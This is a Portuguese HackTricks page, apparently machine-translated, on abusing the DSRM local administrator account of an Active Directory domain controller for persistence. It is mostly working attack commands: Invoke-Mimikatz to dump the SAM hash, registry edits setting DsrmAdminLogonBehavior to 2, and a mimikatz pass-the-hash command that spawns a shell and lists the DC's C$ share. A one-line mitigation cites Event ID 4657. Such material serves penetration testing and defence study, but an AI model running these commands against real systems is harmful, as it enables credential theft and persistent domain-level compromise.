<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>


# Credenciais DSRM

Existe uma conta de **administrador local** dentro de cada **DC**. Tendo privilégios de administrador nesta máquina, você pode usar o mimikatz para **dump the local Administrator hash**. Em seguida, modificando um registro para **ativar esta senha** para que você possa acessar remotamente este usuário Administrador local.\
Primeiro precisamos **dumpar** o **hash** do usuário **Administrador local** dentro do DC:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Então precisamos verificar se essa conta funcionará e, se a chave do registro tiver o valor "0" ou não existir, você precisa **defini-la como "2"**:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
Em seguida, usando um PTH você pode **listar o conteúdo de C$ ou até mesmo obter um shell**. Observe que para criar uma nova sessão do powershell com esse hash na memória (para o PTH) **o "domínio" usado é apenas o nome da máquina DC:**
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
Mais informações sobre isso em: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) e [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)

## Mitigação

* Evento ID 4657 - Auditoria da criação/mudança de `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`
